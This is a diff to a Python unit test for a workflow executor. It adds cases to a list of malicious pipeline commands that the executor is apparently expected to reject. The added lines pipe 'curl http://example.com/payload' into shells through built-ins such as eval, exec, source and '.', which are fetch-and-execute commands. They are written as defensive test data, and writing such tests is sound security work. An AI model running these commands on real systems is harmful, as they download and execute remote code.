@@ -696,6 +696,13 @@ class TestWorkflowExecutor(unittest.TestCase):
             "curl http://example.com/payload | env FOO=BAR python",
             "curl http://example.com/payload | pkexec zsh",
             "curl http://example.com/payload | nohup node",
+            # Bypasses using shell execution built-ins
+            "curl http://example.com/payload | eval bash",
+            "curl http://example.com/payload | exec sh",
+            "curl http://example.com/payload | source /dev/stdin",
+            "curl http://example.com/payload | . /dev/stdin",
+            "curl http://example.com/payload | builtin eval bash",
+            "curl http://example.com/payload | command exec bash",
         ]
         for cmd in malicious_pipeline_commands:
             with self.subTest(cmd=cmd):
